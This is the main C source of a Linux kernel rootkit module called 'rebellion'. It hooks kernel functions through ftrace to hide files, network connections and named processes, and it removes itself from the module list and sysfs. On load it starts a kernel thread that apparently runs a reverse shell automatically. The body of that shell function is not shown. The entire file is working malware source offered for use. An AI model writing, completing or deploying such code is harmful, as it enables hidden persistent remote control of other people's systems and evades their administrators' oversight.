#include "config.h"
#include "hooks/kill.h"
#include "hooks/tcpX_seq_show.h"
#include "hooks/udpX_seq_show.h"
#include "hooks/filldir.h"
#include "hooks/icmp_rcv.h"

#ifdef __x86_64__
#define SYSTEM_ARCH(s) "__x64_" s
#else
#define SYSTEM_ARCH(s) s
#endif

static struct ftrace_hook hooks[] = {
    HOOK(SYSTEM_ARCH("sys_kill"), kill_hook, &original_kill),
    HOOK("tcp4_seq_show", tcp4_seq_show_hook, &original_tcp4_seq_show),
    HOOK("tcp6_seq_show", tcp6_seq_show_hook, &original_tcp6_seq_show),
    HOOK("udp4_seq_show", udp4_seq_show_hook, &original_udp4_seq_show),
    HOOK("udp6_seq_show", udp6_seq_show_hook, &original_udp6_seq_show),
    // HOOK("icmp_rcv", icmp_rcv_hook, &original_icmp_rcv), // Removed - using automatic execution instead
    HOOK("filldir", filldir_hook, &original_filldir),
    HOOK("filldir64", filldir_hook, &original_filldir)
};

void hideModule(void) {
	if (isModuleHidden == TRUE) {
        return;
    }

	modPrevious = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	modKOBJPrevious = THIS_MODULE->mkobj.kobj.entry.prev;
	kobject_del(&THIS_MODULE->mkobj.kobj);
	list_del(&THIS_MODULE->mkobj.kobj.entry);
	isModuleHidden = TRUE;
}
 
void showModule(void) {
	int result;

	if (isModuleHidden == FALSE) {
        return;
    }

	list_add(&THIS_MODULE->list, modPrevious);
	result = kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, MODULENAME);
	isModuleHidden = FALSE;
}

// Process hiding helper functions
int add_hidden_process(const char *process_name) {
    int i;
    
    // Check if process is already hidden
    for (i = 0; i < hidden_process_count; i++) {
        if (strncmp(hidden_processes[i], process_name, MAX_PROCESS_NAME_LEN) == 0) {
            return 0; // Already hidden
        }
    }
    
    // Add process if there's space
    if (hidden_process_count < HIDE_PROCESS_LIST_SIZE) {
        strncpy(hidden_processes[hidden_process_count], process_name, MAX_PROCESS_NAME_LEN - 1);
        hidden_processes[hidden_process_count][MAX_PROCESS_NAME_LEN - 1] = '\0';
        hidden_process_count++;
        return 0;
    }
    
    return -1; // List is full
}

int remove_hidden_process(const char *process_name) {
    int i, j;
    
    for (i = 0; i < hidden_process_count; i++) {
        if (strncmp(hidden_processes[i], process_name, MAX_PROCESS_NAME_LEN) == 0) {
            // Shift remaining processes down
            for (j = i; j < hidden_process_count - 1; j++) {
                strncpy(hidden_processes[j], hidden_processes[j + 1], MAX_PROCESS_NAME_LEN);
            }
            hidden_process_count--;
            return 0;
        }
    }
    
    return -1; // Process not found
}

void clear_all_hidden_processes(void) {
    int i;
    // Safely clear each entry
    for (i = 0; i < HIDE_PROCESS_LIST_SIZE; i++) {
        hidden_processes[i][0] = '\0';
    }
    hidden_process_count = 0;
}

bool is_process_hidden(const char *process_name) {
    int i;
    
    if (!process_name) {
        return false;
    }
    
    for (i = 0; i < hidden_process_count; i++) {
        if (hidden_processes[i][0] != '\0' && strstr(process_name, hidden_processes[i]) != NULL) {
            return true;
        }
    }
    
    return false;
}

bool is_pid_hidden_by_name(pid_t pid) {
    struct task_struct *task;
    struct mm_struct *mm;
    char *cmdline, *p;
    char comm_buf[TASK_COMM_LEN];
    bool hidden = false;
    
    // Find task by PID
    rcu_read_lock();
    task = pid_task(find_vpid(pid), PIDTYPE_PID);
    if (!task) {
        rcu_read_unlock();
        return false;
    }
    
    // Check process name (comm)
    get_task_comm(comm_buf, task);
    if (is_process_hidden(comm_buf)) {
        rcu_read_unlock();
        return true;
    }
    
    // Check command line
    mm = get_task_mm(task);
    rcu_read_unlock();
    
    if (mm) {
        down_read(&mm->mmap_lock);
        if (mm->arg_start && mm->arg_end) {
            cmdline = kmalloc(mm->arg_end - mm->arg_start + 1, GFP_KERNEL);
            if (cmdline) {
                if (access_process_vm(task, mm->arg_start, cmdline, 
                                    mm->arg_end - mm->arg_start, 0) > 0) {
                    cmdline[mm->arg_end - mm->arg_start] = '\0';
                    
                    // Replace null bytes with spaces for easier matching
                    for (p = cmdline; p < cmdline + (mm->arg_end - mm->arg_start); p++) {
                        if (*p == '\0') *p = ' ';
                    }
                    
                    if (is_process_hidden(cmdline)) {
                        hidden = true;
                    }
                }
                kfree(cmdline);
            }
        }
        up_read(&mm->mmap_lock);
        mmput(mm);
    }
    
    return hidden;
}

static int __init rebellion_init(void) {
    revshell_thread = kthread_run(revshell_func, NULL, "shell_thread");
    if (IS_ERR(revshell_thread)) {
        return PTR_ERR(revshell_thread);
    }

    int err; 
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if (err) {
        return err;
    }

    return 0;
}

static void __exit rebellion_exit(void) {
    if (revshell_thread) {
        kthread_stop(revshell_thread);
    }
    
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}

module_init(rebellion_init);
module_exit(rebellion_exit);
